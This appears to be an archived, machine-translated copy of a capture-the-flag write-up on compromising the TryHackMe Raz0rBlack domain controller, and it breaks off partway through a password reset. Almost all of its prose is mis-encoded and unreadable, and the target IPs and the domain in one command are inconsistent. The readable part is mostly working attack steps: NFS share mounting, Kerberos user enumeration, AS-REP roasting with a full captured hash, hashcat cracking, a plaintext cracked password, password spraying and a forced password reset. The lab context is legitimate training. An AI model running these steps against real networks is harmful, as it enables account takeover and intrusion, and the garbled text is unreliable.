<html>
<head>
<title>THM: Raz0rBlack</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">THM: Raz0rBlack</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/thm-raz0rblack-b368631c38a5?source=collection_archive---------1-----------------------#2022-04-24">https://infosecwriteups.com/thm-raz0rblack-b368631c38a5?source=collection_archive---------1-----------------------#2022-04-24</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/ccda82f92604b188937554ebf8f0500f.png" data-original-src="https://miro.medium.com/v2/resize:fit:874/format:webp/1*IiF4IUOQlCqqs52rPnXBMg.png"/></div></figure><p id="56f0" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘é€šè¿‡æšä¸¾RPCbind &amp; NFSã€æ»¥ç”¨Kerberosã€æšä¸¾SMBä»¥åŠé€šè¿‡åˆ©ç”¨å±äº<strong class="jw ir"> Backup Operators </strong>ç»„çš„ä¸€ä¸ªç”¨æˆ·æ¥æå‡æˆ‘åœ¨åŸŸæ§åˆ¶å™¨ä¸Šçš„æƒé™ï¼Œé€æ­¥å®Œæˆäº†åˆ©ç”¨åŸŸæ§åˆ¶å™¨çš„è¿‡ç¨‹ã€‚è¿™ä¸ªæŒ‘æˆ˜åœ¨<a class="ae ks" href="https://tryhackme.com/" rel="noopener ugc nofollow" target="_blank"> TryHackMe </a>å¹³å°ä¸Šæœ‰ï¼Œæ ‡é¢˜ä¸ºâ€œ<strong class="jw ir"> RAZ0RBLACK 2.1 </strong>ï¼Œç”±ç”¨æˆ·â€œ<a class="ae ks" href="https://tryhackme.com/p/Xyan1d3" rel="noopener ugc nofollow" target="_blank"> <em class="kt"> Xyan1d3 </em> </a>â€åˆ›å»ºã€‚</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="905b" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">æ”¾å¼ƒ</h1><p id="9867" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">æˆ‘å–œæ¬¢åœ¨ä¸€ç¯‡æ–‡ç« ä¹‹å‰æ·»åŠ ä¸€ä¸ªç®€çŸ­çš„å…è´£å£°æ˜ï¼Œä»¥é¼“åŠ±äººä»¬åœ¨é˜…è¯»æœ¬æ–‡ä¹‹å‰å°è¯•ä¸€ä¸‹è¿™ä¸ªæˆ¿é—´ï¼Œå› ä¸ºåœ¨è¿™ç¯‡æ–‡ç« ä¸­æ˜¾ç„¶ä¼šæœ‰<strong class="jw ir">å‰§é€</strong><strong class="jw ir"/>ã€‚æˆ‘ç›¸ä¿¡ï¼Œå¦‚æœä½ å…ˆè‡ªå·±å°è¯•ï¼Œç„¶ååœ¨é‡åˆ°å›°éš¾æˆ–éœ€è¦æç¤ºæ—¶å†å›æ¥å†™è¿™ç¯‡æ–‡ç« ï¼Œä½ ä¼šæ›´å–œæ¬¢è¿™ä¸ªæŒ‘æˆ˜ã€‚å› æ­¤ï¼Œæ²¡æœ‰ä»»ä½•è¿›ä¸€æ­¥çš„æ‹–å»¶ï¼Œè®©æˆ‘ä»¬å¼€å§‹å§ï¼</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="952d" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">ç«¯å£æšä¸¾</h1><p id="ff96" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">æˆ‘å¼€å§‹æšä¸¾ç›®æ ‡æœºå™¨ï¼Œç”¨<strong class="jw ir"> NMAP </strong>æ‰§è¡Œå¿«é€Ÿæ‰«ææ¥è¯†åˆ«ä»»ä½•æ‰“å¼€çš„ç«¯å£ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="ebc2" class="mn lc iq mj b gy mo mp l mq mr">nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report -Pn 10.10.7.159</span><span id="8dbc" class="mn lc iq mj b gy ms mp l mq mr">PORT      STATE SERVICE          REASON<br/>53/tcp    open  domain           syn-ack ttl 125<br/>88/tcp    open  kerberos-sec     syn-ack ttl 125               111/tcp   open  rpcbind          syn-ack ttl 125<br/>135/tcp   open  msrpc            syn-ack ttl 125<br/>139/tcp   open  netbios-ssn      syn-ack ttl 125<br/>445/tcp   open  microsoft-ds     syn-ack ttl 125<br/>593/tcp   open  http-rpc-epmap   syn-ack ttl 125<br/>636/tcp   open  ldapssl          syn-ack ttl 125<br/>2049/tcp  open  nfs              syn-ack ttl 125<br/>3268/tcp  open  globalcatLDAP    syn-ack ttl 125<br/>3269/tcp  open  globalcatLDAPssl syn-ack ttl 125<br/>3389/tcp  open  ms-wbt-server    syn-ack ttl 125<br/>5985/tcp  open  wsman            syn-ack ttl 125<br/>9389/tcp  open  adws             syn-ack ttl 125<br/>47001/tcp open  winrm            syn-ack ttl 125<br/>49664/tcp open  unknown          syn-ack ttl 125<br/>49665/tcp open  unknown          syn-ack ttl 125<br/>49666/tcp open  unknown          syn-ack ttl 125<br/>49669/tcp open  unknown          syn-ack ttl 125<br/>49672/tcp open  unknown          syn-ack ttl 125<br/>49675/tcp open  unknown          syn-ack ttl 125<br/>49676/tcp open  unknown          syn-ack ttl 125<br/>49679/tcp open  unknown          syn-ack ttl 125<br/>49694/tcp open  unknown          syn-ack ttl 125<br/>49708/tcp open  unknown          syn-ack ttl 125<br/>49846/tcp open  unknown          syn-ack ttl 125</span></pre><p id="bf85" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æŸ¥çœ‹è¾“å‡ºï¼Œæˆ‘å¯ä»¥çœ‹åˆ°æœ‰26ä¸ªç«¯å£æ˜¯æ‰“å¼€çš„ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä½¿ç”¨NMAPæ¥è¯†åˆ«æ¯ä¸ªç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ï¼Œå¹¶ä½¿ç”¨é€šç”¨çš„NSEè„šæœ¬æ¥æŸ¥æ‰¾æˆ‘å¯ä»¥åˆ©ç”¨çš„ä»»ä½•å¸¸è§æ¼æ´ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="0a3e" class="mn lc iq mj b gy mo mp l mq mr">nmap -sV -sC -Pn -v -oN nmap-report 10.10.7.159 -p 53,111,135,139,445,593,636,2049,3268,3269,3389,5985,9389,47001,49664,49665,49666,49669,49672,49675,49676,49679,49694,49708,49846</span></pre><p id="e56b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°NMAPçš„å¤§é‡è¾“å‡ºå’Œä¸€äº›æœ‰è¶£çš„æœåŠ¡ï¼Œæˆ‘å¯ä»¥è¿›ä¸€æ­¥åˆ—ä¸¾ã€‚</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="8153" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">Rpcbindå’ŒNFSæšä¸¾</h1><p id="529c" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">å½“NMAPæ‰«æè¿è¡ŒrpcbindæœåŠ¡çš„ç«¯å£111æ—¶ï¼Œå®ƒæ”¶é›†äº†å¤§é‡ä¿¡æ¯ã€‚<strong class="jw ir"> rpcbind </strong>æœåŠ¡å°†å®¢æˆ·ç«¯é‡å®šå‘åˆ°æ­£ç¡®çš„ç«¯å£å·ï¼Œä»¥ä¾¿å®ƒå¯ä»¥ä¸æ‰€è¯·æ±‚çš„æœåŠ¡è¿›è¡Œé€šä¿¡ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="915f" class="mn lc iq mj b gy mo mp l mq mr">111/tcp   open  rpcbind       2-4 (RPC #100000)<br/>| rpcinfo: <br/>|   program version    port/proto  service<br/>|   100000  2,3,4        111/tcp   rpcbind<br/>|   100000  2,3,4        111/tcp6  rpcbind<br/>|   100000  2,3,4        111/udp   rpcbind<br/>|   100000  2,3,4        111/udp6  rpcbind<br/>|   100003  2,3         2049/udp   nfs  <strong class="mj ir">&lt;---- Interesting</strong><br/>|   100003  2,3         2049/udp6  nfs<br/>|   100003  2,3,4       2049/tcp   nfs<br/>|   100003  2,3,4       2049/tcp6  nfs<br/>|   100005  1,2,3       2049/tcp   mountd<br/>|   100005  1,2,3       2049/tcp6  mountd<br/>|   100005  1,2,3       2049/udp   mountd<br/>|   100005  1,2,3       2049/udp6  mountd<br/>|   100021  1,2,3,4     2049/tcp   nlockmgr<br/>|   100021  1,2,3,4     2049/tcp6  nlockmgr<br/>|   100021  1,2,3,4     2049/udp   nlockmgr<br/>|   100021  1,2,3,4     2049/udp6  nlockmgr<br/>|   100024  1           2049/tcp   status<br/>|   100024  1           2049/tcp6  status<br/>|   100024  1           2049/udp   status<br/>|_  100024  1           2049/udp6  status</span></pre><p id="0e1b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°NMAPæ ‡è¯†äº†<a class="ae ks" href="https://book.hacktricks.xyz/pentesting/pentesting-rpcbind#rpcbind-+-nfs" rel="noopener ugc nofollow" target="_blank"> <strong class="jw ir"> NFS </strong>æœåŠ¡</a>ï¼Œè¿™æ„å‘³ç€æˆ‘å¯ä»¥åˆ—å‡ºå¹¶ä¸‹è½½(ä¹Ÿè®¸è¿˜å¯ä»¥ä¸Šä¼ )æ–‡ä»¶ã€‚æˆ‘è¿˜å¯ä»¥çœ‹åˆ°NMAPæ‰¾åˆ°äº†NFSè¿è¡Œçš„2049ç«¯å£ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="1a80" class="mn lc iq mj b gy mo mp l mq mr">2049/tcp  open  mountd        1-3 (RPC #100005)</span></pre><p id="de39" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">NFSæ˜¯ä¸€ä¸ªå®¢æˆ·æœº/æœåŠ¡å™¨ç³»ç»Ÿï¼Œå®ƒå…è®¸ç”¨æˆ·é€šè¿‡ç½‘ç»œè®¿é—®æ–‡ä»¶ï¼Œå¹¶å°†å®ƒä»¬è§†ä¸ºé©»ç•™åœ¨æœ¬åœ°æ–‡ä»¶ç›®å½•ä¸­ã€‚æˆ‘å¯ä»¥ä½¿ç”¨<strong class="jw ir"> showmount </strong>å·¥å…·æ£€æŸ¥æ˜¯å¦æœ‰ä»»ä½•å…±äº«å¯ä¾›å®‰è£…ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="59f3" class="mn lc iq mj b gy mo mp l mq mr">$sudo showmount -e 10.10.7.159<br/>[sudo] password for kali: <br/>Export list for 10.10.7.159:<br/><strong class="mj ir">/users (everyone)</strong></span></pre><p id="ead5" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">â€œ<strong class="jw ir"><em class="kt">/ç”¨æˆ·</em> </strong>â€ç›®å½•æ˜¯å¯æŒ‚è½½çš„ã€‚æˆ‘åœ¨tmpæ–‡ä»¶å¤¹ä¸‹åˆ›å»ºäº†ä¸€ä¸ªæ–°ç›®å½•ï¼Œå¹¶è¿è¡Œä»¥ä¸‹å‘½ä»¤åœ¨è¿™ä¸ªæ–°åˆ›å»ºçš„ç›®å½•ä¸ŠæŒ‚è½½ä¸»æ–‡ä»¶å¤¹ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="55d4" class="mn lc iq mj b gy mo mp l mq mr">mkdir /tmp/infosec<br/>mount -t nfs 10.10.63.208:/users /tmp/infosec</span></pre><p id="9322" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘æ£€æŸ¥äº†ç›®å½•æ˜¯å¦æˆåŠŸæŒ‚è½½ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="d714" class="mn lc iq mj b gy mo mp l mq mr">$ df -k</span><span id="8481" class="mn lc iq mj b gy ms mp l mq mr">10.10.7.159:/users  20407296  16603136   3804160  82% /tmp/infosec</span></pre><p id="ab22" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘å¯¼èˆªåˆ°â€œ<strong class="jw ir"> <em class="kt"> /tmp/infosec </em> </strong>â€ç›®å½•ï¼Œåˆ—å‡ºå†…å®¹ã€‚æˆ‘å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªæ–‡ä»¶ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="f315" class="mn lc iq mj b gy mo mp l mq mr">$ sudo ls -la /tmp/infosec<br/><br/>-rwx------  1 nobody 4294967294  9861 Feb 25  2021 <strong class="mj ir">employee_status.xlsx</strong><br/>-rwx------  1 nobody 4294967294    80 Feb 25  2021 <strong class="mj ir">sbradley.txt</strong></span></pre><p id="7267" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘å°†è¿™ä¸¤ä¸ªæ–‡ä»¶å¤åˆ¶åˆ°æˆ‘å½“å‰çš„å·¥ä½œç›®å½•ä¸­ï¼Œå¹¶ä¸ºç”¨æˆ·Stevenæ£€ç´¢ç¬¬ä¸€ä¸ªæ ‡å¿—ï¼Œå®ƒå­˜å‚¨åœ¨â€œ<strong class="jw ir"> <em class="kt"> sbradley.txt </em> </strong>â€ä¸­ã€‚</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi mt"><img src="../Images/2c5a81ccb6304a56531576e83c32d294.png" data-original-src="https://miro.medium.com/v2/resize:fit:882/format:webp/1*6Uc_vHO6VG9P-vhE1L5vxQ.png"/></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">å²è’‚æ–‡çš„æ——å­ã€‚</figcaption></figure><p id="99bd" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘æ‰“å¼€äº†â€œ<strong class="jw ir"><em class="kt">employee _ status . xlsx</em></strong>â€æ–‡ä»¶ã€‚</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi my"><img src="../Images/012509891d2ecf25ce9cef64976838cf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1256/format:webp/1*Axi692Cc6FwTB1mE8OWxeA.png"/></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated"><strong class="bd ld"><em class="mz">employee _ status . xlsx</em></strong>æ–‡ä»¶å†…å®¹ã€‚</figcaption></figure><p id="2bea" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°haven secret hackerä¿±ä¹éƒ¨ä¸­çš„ç©å®¶åŠå…¶è§’è‰²åˆ—è¡¨ã€‚ç”¨æˆ·"<strong class="jw ir"><em class="kt">ljudmila vetrova</em></strong>"ç‰¹åˆ«æœ‰è¶£ï¼Œå› ä¸ºä»–ä»¬æ˜¯æ´»åŠ¨ç›®å½•ç®¡ç†å‘˜ã€‚</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="5597" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">Kerberosæšä¸¾</h1><p id="9ad8" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">Kerberosæ˜¯è¿è¡Œåœ¨ç«¯å£88ä¸Šçš„Active Directoryä¸­çš„ä¸€é¡¹å…³é”®èº«ä»½éªŒè¯æœåŠ¡ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å·¥å…·<strong class="jw ir">Kerberos</strong>æ¥æšä¸¾ç”¨æˆ·ï¼Œé€šè¿‡Kerberosé¢„è®¤è¯ï¼Œå¯ä»¥å¿«é€Ÿå¼ºåˆ¶æšä¸¾æœ‰æ•ˆçš„Active Directoryå¸æˆ·ã€‚è¦ä½¿ç”¨<strong class="jw ir"> kerbrute </strong>ï¼Œæˆ‘ä»¬éœ€è¦æŒ‡å®šåŸŸåå¹¶æä¾›ä¸€ä¸ªç”¨æˆ·åˆ—è¡¨ã€‚æ­¤å‰ï¼ŒNMAPæ ¹æ®3389ç«¯å£æä¾›çš„ä¿¡æ¯ï¼Œå·²å°†è¯¥åŸŸåç¡®å®šä¸ºâ€œ<strong class="jw ir"><em class="kt">â€Raz 0 rblack . thm</em></strong>â€ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="bd60" class="mn lc iq mj b gy mo mp l mq mr">3389/tcp  open  ms-wbt-server Microsoft Terminal Services<br/>| rdp-ntlm-info: <br/>|   Target_Name: RAZ0RBLACK<br/>|   NetBIOS_Domain_Name: RAZ0RBLACK<br/>|   NetBIOS_Computer_Name: HAVEN-DC<br/>|   DNS_Domain_Name: <strong class="mj ir">raz0rblack.thm</strong><br/>|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm</span></pre><p id="2f39" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨å‰é¢åœ¨â€œ<strong class="jw ir"><em class="kt">employee _ status . xlsx</em></strong>â€æ–‡ä»¶ä¸­å‘ç°çš„å§“ååˆ—è¡¨æ¥æšä¸¾ç”¨æˆ·ã€‚æ ¹æ®ç”¨äºâ€œ<em class="kt"> sbradley.txt </em>â€å’Œè´¨è¯¢é—®é¢˜çš„å‘½åçº¦å®šï¼Œç”¨æˆ·åå­—çš„é¦–å­—æ¯ä¸å…¶å§“æ°è¿æ¥åœ¨ä¸€èµ·ã€‚åœ¨åŸºäºâ€œ<strong class="jw ir"><em class="kt">employee _ status . xlsx</em></strong>â€æ–‡ä»¶ä¸­çš„åç§°åˆ—è¡¨åˆ›å»ºç”¨æˆ·åˆ—è¡¨æ—¶ï¼Œæˆ‘ä½¿ç”¨äº†è¿™ä¸ªå‘½åçº¦å®šã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="68ff" class="mn lc iq mj b gy mo mp l mq mr">./kerbrute_linux_amd64 userenum --dc 10.10.253.179 -d spookysec.local -o kerbrute-user-enum userlist</span><span id="bc18" class="mn lc iq mj b gy ms mp l mq mr">2022/04/09 20:40:42 &gt;  [+] VALID USERNAME:  lvetrova@raz0rblack.thm<br/>2022/04/09 20:40:42 &gt;  [+] VALID USERNAME:  twilliams@raz0rblack.thm<br/>2022/04/09 20:40:42 &gt;  [+] VALID USERNAME:  sbradley@raz0rblack.thm</span></pre><h2 id="f6af" class="mn lc iq bd ld na nb dn lh nc nd dp ll kf ne nf lp kj ng nh lt kn ni nj lx nk bi translated">asé‡æ–°å‘å¸ƒ</h2><p id="f102" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">ç°åœ¨æˆ‘æœ‰äº†ä¸€äº›ç”¨æˆ·åï¼Œæˆ‘å†³å®šè¿›è¡Œé‡æ–°å‘å¸ƒã€‚å½“ç”¨æˆ·å¸æˆ·è®¾ç½®äº†æƒé™â€œ<em class="kt">ä¸éœ€è¦é¢„è®¤è¯</em>â€æ—¶ï¼Œä¼šå‡ºç°è¿™ç§æƒ…å†µã€‚è¿™æ„å‘³ç€åœ¨è¯·æ±‚æŒ‡å®šç”¨æˆ·å¸æˆ·ä¸Šçš„Kerberosç¥¨è¯ä¹‹å‰ï¼Œå¸æˆ·ä¸éœ€è¦æä¾›æœ‰æ•ˆçš„èº«ä»½è¯æ˜ã€‚ä½¿ç”¨Impacketå·¥å…·"<strong class="jw ir"><em class="kt">getnpusers . py</em></strong>"ï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥ä¹‹å‰ç”¨Kerberosæ ‡è¯†çš„æšä¸¾ç”¨æˆ·åˆ—è¡¨ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="8c33" class="mn lc iq mj b gy mo mp l mq mr">sudo python3 GetNPUsers.py raz0rblack.thm/ -dc-ip 10.10.160.198 -usersfile kerberos-usernames -no-pass -request -outputfile kerberos-users-found</span></pre><p id="9261" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æŸ¥çœ‹è¾“å‡ºæ–‡ä»¶ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¸ºç”¨æˆ·â€œ<strong class="jw ir"><em class="kt">twilliams @ Raz 0 r black . thm</em></strong>â€è·å¾—äº†ä¸€å¼ TGTçš„ç¥¨</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="9cd4" class="mn lc iq mj b gy mo mp l mq mr">$krb5asrep$23$twilliams@raz0rblack.thm@RAZ0RBLACK.THM:50792603765164974bfbcf6b50a79f03$515241628dc6711dd499f6e5c23493b674b4b641c55df1b773fcccc0322ec68b45fa32e84c5f9b6d1097fac39097e6302f7835af51c6c05ac1b5fa392737eb021ea564c392916745a29ac4f7b37f735970ce9bb904c74ebb530086dc93e9b7b8b494e33393430deac61523ebae352a820d64d081fd112219e66331e4cb9ca45f5bba18276606c307b541ee7196d57c224e0f6a491fb0e1327dc2fc63ee62b56e0244a93ef6de3d56ee346fb439674d08ea745d8f927225daf809979329dd0b217d7633f47bcd864b82c135c1f1203b7290f14ad4fec88dce9c49b8e2afa381e5568e7a39fde062ff9d659270015fa9ca</span></pre><p id="d9d9" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘å¯ä»¥ä½¿ç”¨<strong class="jw ir"> hashcat </strong>æ¥ç ´è§£ä»KDCä¸­æ£€ç´¢åˆ°çš„"<strong class="jw ir"><em class="kt">Kerberos 5 AS-REP etype 23</em></strong>"å“ˆå¸Œã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="7554" class="mn lc iq mj b gy mo mp l mq mr">hashcat64.exe -m 18200 -a 0 hash.txt rockyou.txt </span></pre><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/4a96a98a37948c44559618985344f3ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1312/format:webp/1*YjIpLjfRKV0JbgaBSpqTuA.png"/></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">ç ´è§£å“ˆå¸Œã€‚</figcaption></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="a053" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">SMBæšä¸¾</h1><p id="0760" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°ç«¯å£139å’Œ445æ˜¯æ‰“å¼€çš„ã€‚ç«¯å£139å’Œ445ç”¨äº<strong class="jw ir">è®¤è¯å’Œæ–‡ä»¶å…±äº«</strong>ã€‚æœ‰å¤šç§å·¥å…·å¯ç”¨äºæšä¸¾ç«¯å£139/445ã€‚æˆ‘æ˜¯ç”¨<strong class="jw ir"> smbmapå¼€å§‹çš„ã€‚</strong></p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="9367" class="mn lc iq mj b gy mo mp l mq mr">smbmap -H 10.10.160.198 -u twilliams -p roastpotatoes<br/>                                    <br/>Disk                    Permissions     Comment<br/>----                    -----------     -------<br/>ADMIN$                  NO ACCESS       Remote Admin<br/>C$                      NO ACCESS       Default share<br/>IPC$                    READ ONLY       Remote IPC<br/>NETLOGON                READ ONLY       Logon server share <br/>SYSVOL                  READ ONLY       Logon server share <br/><strong class="mj ir">trash                   NO ACCESS       Files Pending for deletion</strong></span></pre><p id="9570" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°<strong class="jw ir"> IPC$ </strong>æ˜¯<strong class="jw ir">åªè¯»</strong>ï¼Œè¡¨ç¤ºæˆ‘ä»¬å¯ä»¥æšä¸¾ç”¨æˆ·åã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="62fc" class="mn lc iq mj b gy mo mp l mq mr">crackmapexec smb 10.10.160.198 -u twilliams -p &lt;....&gt; --rid-brute</span><span id="f323" class="mn lc iq mj b gy ms mp l mq mr">500: RAZ0RBLACK\Administrator (SidTypeUser)<br/>501: RAZ0RBLACK\Guest (SidTypeUser)<br/>502: RAZ0RBLACK\krbtgt (SidTypeUser)<br/>1000: RAZ0RBLACK\HAVEN-DC$ (SidTypeUser)<br/>1106: RAZ0RBLACK\xyan1d3 (SidTypeUser)<br/>1107: RAZ0RBLACK\lvetrova (SidTypeUser)<br/>1108: RAZ0RBLACK\sbradley (SidTypeUser)<br/>1109: RAZ0RBLACK\twilliams (SidTypeUser)</span></pre><p id="3e37" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæœ‰è¶£çš„SMBå…±äº«ï¼Œåä¸ºâ€œ<strong class="jw ir"><em class="kt">â€trash</em>â€</strong>ï¼Œä½†æˆ‘ç›®å‰æ²¡æœ‰ç”¨æˆ·â€œ<strong class="jw ir"> <em class="kt"> twilliams </em> </strong>â€çš„å‡­æ®æ¥è®¿é—®å®ƒã€‚æˆ‘å†³å®šä½¿ç”¨<strong class="jw ir"> crackmapexec </strong>å’ŒIPC$ shareä¸­æšä¸¾çš„ç”¨æˆ·åˆ—è¡¨æ¥æ£€æŸ¥å¯†ç é‡ç”¨ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="5d7b" class="mn lc iq mj b gy mo mp l mq mr">crackmapexec smb 10.10.169.150 -u userlist -p &lt;....&gt;</span><span id="46b4" class="mn lc iq mj b gy ms mp l mq mr">[-] raz0rblack.thm\Administrator:&lt;pass&gt; STATUS_LOGON_FAILURE <br/>[-] raz0rblack.thm\guest:&lt;pass&gt; STATUS_LOGON_FAILURE <br/>[-] raz0rblack.thm\krbtgt:&lt;pass&gt; STATUS_LOGON_FAILURE <br/>[-] raz0rblack.thm\HAVEN-DC$:&lt;pass&gt; STATUS_LOGON_FAILURE <br/>[-] raz0rblack.thm\ljudmila:&lt;pass&gt; STATUS_LOGON_FAILURE <br/>[-] raz0rblack.thm\lvetrova:&lt;pass&gt; STATUS_LOGON_FAILURE <br/><strong class="mj ir">[-] raz0rblack.thm\sbradley:&lt;pass&gt; STATUS_PASSWORD_MUST_CHANGE</strong></span></pre><p id="2fa1" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">çœ‹æ¥ç”¨æˆ·â€œ<strong class="jw ir"><em class="kt">SBR adley</em></strong>â€<strong class="jw ir"/>å¯ä»¥é‡ç½®è‡ªå·±çš„å¯†ç ã€‚æˆ‘ä»¬å¯ä»¥æŒ‡å®šæ—§å¯†ç (å³ä¸Šé¢ä¸crackmapexecä¸€èµ·ä½¿ç”¨çš„å¯†ç )å’Œå·¥å…·<strong class="jw ir"> smbpasswd </strong>æ¥é‡ç½®ç”¨æˆ·å¯†ç ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="a665" class="mn lc iq mj b gy mo mp l mq mr">smbpasswd -r 10.10.169.150 -U sbradley</span><span id="b094" class="mn lc iq mj b gy ms mp l mq mr">Old SMB password:<br/>New SMB password:<br/>Retype new SMB password:<br/>Password changed for user 